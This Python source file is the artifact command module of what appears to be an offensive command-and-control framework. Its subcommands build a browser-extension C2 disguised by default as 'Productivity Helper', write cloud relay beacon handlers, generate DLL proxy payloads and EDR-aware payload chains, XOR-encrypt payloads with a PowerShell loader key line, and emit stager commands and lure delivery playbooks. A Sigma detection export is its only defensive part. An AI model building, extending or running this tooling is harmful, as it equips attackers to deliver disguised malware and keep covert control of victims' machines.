# language: Python 3.11+, file: cf/cmds_artifacts.py
# *artifacts — extension c2, cloud relay, payload factory, stager, techniques, playbooks*
from __future__ import annotations

from pathlib import Path

from .cli_core import _render_kv, _render_table, err, ok, text
from .util import c_bold, c_cyan, c_dim, c_green, c_yellow, json_dumps, write_text


class ArtifactCommands:
    """Artifact group — composed into Cli (cf.cli); self.pos/flags/store and
    the dispatch helpers (_need/_feature/_campaign/_base) live there."""

    def cmd_ext(self) -> None:
        from .ext import ExtensionC2

        self._feature("ext")
        if len(self.pos) < 2:
            err("ext build|manifest|playbook")
            raise SystemExit(2)
        sub = self.pos[1]
        if sub == "build":
            if len(self.pos) < 5:
                raise SystemExit("ext build <out.zip> <c2_url> <device_id>")
            path = ExtensionC2.build_zip(
                self.pos[2],
                self.pos[3],
                self.pos[4],
                ext_name=str(self.flags.get("name", "Productivity Helper")),
            )
            ok(f"extension → {path}")
        elif sub == "manifest":
            print(json_dumps(ExtensionC2.manifest(str(self.flags.get("name", "Productivity Helper")))))
        elif sub == "playbook":
            print(json_dumps(ExtensionC2.distribution_playbook()))
        else:
            err("ext build|manifest|playbook")
            raise SystemExit(2)

    # ─── relay ───


    def cmd_relay(self) -> None:
        from .relay import CloudRelay

        self._feature("relay")
        if len(self.pos) < 2:
            err("relay lambda|azure|client|playbook")
            raise SystemExit(2)
        sub = self.pos[1]
        if sub in ("lambda", "azure"):
            out_dir = str(self.flags.get("out", "."))
            written = CloudRelay.write_handlers(out_dir)
            for k, v in written.items():
                ok(f"{k} → {v}")
        elif sub == "client":
            if len(self.pos) < 4:
                raise SystemExit("relay client <c2_url> <key>")
            text(CloudRelay.beacon_client(self.pos[2], self.pos[3]))
        elif sub == "playbook":
            print(json_dumps(CloudRelay.deployment_playbook()))
        else:
            err("relay lambda|azure|client|playbook")
            raise SystemExit(2)

    # ─── payload ───


    def cmd_payload(self) -> None:
        from .payload import PayloadFactory

        self._feature("payload")
        if len(self.pos) < 2:
            err("payload proxy|hpp|chain")
            raise SystemExit(2)
        sub = self.pos[1]
        if sub == "proxy":
            if len(self.pos) < 3:
                raise SystemExit("payload proxy <host_dll> [outdir]")
            try:
                res = PayloadFactory.generate_dll_proxy(
                    self.pos[2],
                    output_dir=self.pos[3] if len(self.pos) > 3 else "./build",
                )
            except (ValueError, OSError) as exc:
                err(str(exc))
                raise SystemExit(1) from None
            print(json_dumps(res))
        elif sub == "hpp":
            out = write_text(
                str(self.flags.get("out", "payload_factory.hpp")),
                PayloadFactory._payload_hpp_source(),
            )
            ok(f"{out} written")
        elif sub == "chain":
            if len(self.pos) < 3:
                raise SystemExit("payload chain <os> [edr_hint]")
            print(
                json_dumps(
                    PayloadFactory.build_chain_for_target(
                        self.pos[2],
                        self.pos[3] if len(self.pos) > 3 else "",
                    )
                )
            )
        elif sub == "xor":
            from .stager import xor_bytes, xor_key

            if len(self.pos) < 3:
                raise SystemExit("payload xor <file> --token T")
            token = str(self.flags.get("token", ""))
            if not token:
                raise SystemExit("--token required (target token the loader will use)")
            key = xor_key(token)
            src = Path(self.pos[2])
            data = src.read_bytes()
            out = src.with_suffix(src.suffix + ".xor")
            out.write_bytes(xor_bytes(data, key))
            ok(f"{out} written — key={key.hex()}")
            text("  prepend to the loader: $k=[byte[]](" + ",".join(str(b) for b in key) + ")")
        else:
            err("payload proxy|hpp|chain|xor")
            raise SystemExit(2)

    # ─── stager / playbooks ───


    def cmd_stager(self) -> None:
        from .stager import Stager

        if len(self.pos) < 2:
            err("stager command <kind> <url>")
            raise SystemExit(2)
        if self.pos[1] != "command" or len(self.pos) < 4:
            raise SystemExit("stager command <kind> <url>")
        text(Stager.command(self.pos[2], self.pos[3]))

    # ─── technique catalog ───


    def cmd_technique(self) -> None:
        from .techniques import TECHNIQUES, find, get, markdown, table

        sub = self.pos[1] if len(self.pos) > 1 else "list"
        if sub == "list":
            rows = table(
                find(
                    surface=str(self.flags.get("surface", "")),
                    category=str(self.flags.get("category", "")),
                    query=str(self.flags.get("q", "")),
                    tag=str(self.flags.get("tag", "")),
                    serveable=(
                        None if "serveable" not in self.flags else True
                    ),
                )
            )
            if not rows:
                text("no techniques match those filters")
                return
            print(
                json_dumps(rows)
                if self.flags.get("json")
                else _render_table(rows)
            )
            return
        if sub == "show":
            if len(self.pos) < 3:
                raise SystemExit("technique show <id>")
            try:
                tech = get(self.pos[2])
            except KeyError as exc:
                raise SystemExit(str(exc)) from None
            if self.flags.get("json"):
                print(json_dumps(tech.as_dict()))
                return
            base = str(self.flags.get("url", "https://HOST"))
            text(c_bold(f"  {tech.id}") + f" — {tech.name}")
            text()
            stars = c_green("★" * tech.reliability) + c_dim("☆" * (5 - tech.reliability))
            _render_kv([
                ("surface", tech.surface),
                ("category", tech.category),
                ("delivery", tech.kind or c_dim("operator infra")),
                ("clipboard", "yes" if tech.clipboard else "no"),
                ("min os", tech.min_os),
                ("mitre", tech.mitre or c_dim("n/a")),
                ("reliability", stars),
                ("tags", ", ".join(tech.tags) or c_dim("-")),
            ])
            text()
            text(f"  {c_dim('steps:')}")
            for i, step in enumerate(tech.steps, 1):
                text(f"    {c_cyan(str(i) + '.')} {step}")
            text()
            _render_kv([
                ("command", c_yellow(tech.command_for(base, "TOKEN"))),
                ("telemetry", ", ".join(tech.telemetry)),
                ("detection", tech.detection),
                ("opsec", tech.opsec),
            ])
            return
        if sub == "export":
            fmt = str(self.flags.get("format", "md"))
            if self.flags.get("sigma") or fmt.startswith("sigma"):
                self._feature("sigma")
                from .techniques import sigma_rules

                body = sigma_rules(
                    serveable_only=not self.flags.get("all", False)
                )
                out = self.flags.get("out")
                if out:
                    p = write_text(str(out), body)
                    ok(f"sigma rules → {p}")
                else:
                    print(body)
                return
            body = (
                markdown()
                if fmt.startswith("md")
                else json_dumps([t.as_dict() for t in TECHNIQUES.values()])
            )
            out = self.flags.get("out")
            if out:
                p = write_text(str(out), body)
                ok(f"{len(TECHNIQUES)} techniques → {p}")
            else:
                print(body)
            return
        err("technique list|show|export")
        raise SystemExit(2)

    # ─── engagement report ───


    def cmd_playbook(self) -> None:
        from .c2 import LegitServiceC2
        from .delivery import SaaSNotifyDelivery
        from .ext import ExtensionC2
        from .lure import LureBuilder
        from .relay import CloudRelay
        from .stager import Stager

        topic = self.pos[1] if len(self.pos) > 1 else "saas"
        table = {
            "saas": SaaSNotifyDelivery.provider_playbook,
            "c2": LegitServiceC2.privacy_notes,
            "ext": ExtensionC2.distribution_playbook,
            "relay": CloudRelay.deployment_playbook,
            "stager": Stager.kinds,
            "scenario": LureBuilder.list,
        }
        fn = table.get(topic)
        if fn is None:
            raise SystemExit(f"unknown playbook: {topic}")
        print(json_dumps(fn()))
